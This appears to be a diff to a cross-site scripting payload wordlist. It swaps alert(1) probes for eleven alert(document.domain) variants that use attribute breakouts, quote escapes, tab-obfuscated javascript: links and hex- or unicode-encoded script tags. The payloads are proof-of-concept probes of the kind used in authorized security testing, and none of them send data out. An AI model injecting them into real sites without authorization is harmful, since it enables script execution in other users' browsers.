@@ -1,4 +1,11 @@
-<script>alert(1)</script>
-"><script>alert(1)</script>
-"><img src=x onerror=alert(1)>
-"><img src=x onerror="alert(1)"
+<script>alert(document.domain)</script>
+"><script>alert(document.domain)</script>
+"><img src=x onerror=alert(document.domain)>
+"><img src=x onerror="alert(document.domain)"
+"><script>alert(document.domain);</script>
+\';alert(document.domain);<!--
+\';alert(document.domain);//
+ "><a href="javascr&#09;ipt:alert(document.domain);">XSS</a>
+ \\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e
+ \\u003cscript\\u003ealert(document.domain);\\u003c/script\\u003e
+ #!javascript&#58;alert(document.domain)
